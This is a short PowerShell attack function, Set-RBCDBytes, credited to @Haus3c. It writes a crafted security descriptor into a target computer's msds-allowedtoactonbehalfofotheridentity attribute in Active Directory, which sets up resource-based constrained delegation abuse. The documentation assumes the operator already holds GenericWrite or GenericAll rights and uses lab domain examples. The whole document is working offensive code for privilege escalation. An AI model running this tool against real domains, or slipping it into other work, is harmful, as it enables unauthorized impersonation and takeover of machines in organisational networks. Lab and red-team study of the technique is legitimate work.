function Set-RBCDBytes {
<# 
.SYNOPSIS
    Sets the msds-allowedtoactonbehalfofotheridentity property on a computer object to allow RBCD.
    Author: @Haus3c
	
.PARAMETER 
    -Domain 
	The principal's domain
	
	-TargetComputer
	The name of the target computer that you have GenericWrite or GenericAll privileges over.
	
	-Principal
	The principal (user or computer) that has an SPN set that will be added to the property and be allowed to delegate using RBCD.
	
.EXAMPLE 
    Set-RBCDBytes -Domain LAB.LOCAL -TargetComputer LABWIN10 -Principal 'LABWIN10$'
    Set-RBCDBytes -Domain LAB.LOCAL -TargetComputer LABWIN10 -Principal Bob
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)][String]$Domain = $null,
    [Parameter(Mandatory=$True)][String]$TargetComputer = $null,
    [Parameter(Mandatory=$True)][String]$Principal = $null)
    
    $ID = new-object System.Security.Principal.NTAccount($Domain+"\"+$Principal)
    $SID =  $ID.Translate( [System.Security.Principal.SecurityIdentifier] ).toString()
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($SID))"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)
    $DN=([adsisearcher]"(&(objectclass=computer)(name=$TargetComputer))").FindOne().Properties.distinguishedname
    $adsiobject = [ADSI]"LDAP://$DN"
    $adsiobject.Put("msds-allowedtoactonbehalfofotheridentity",$SDBytes)
    $adsiobject.setinfo()
}
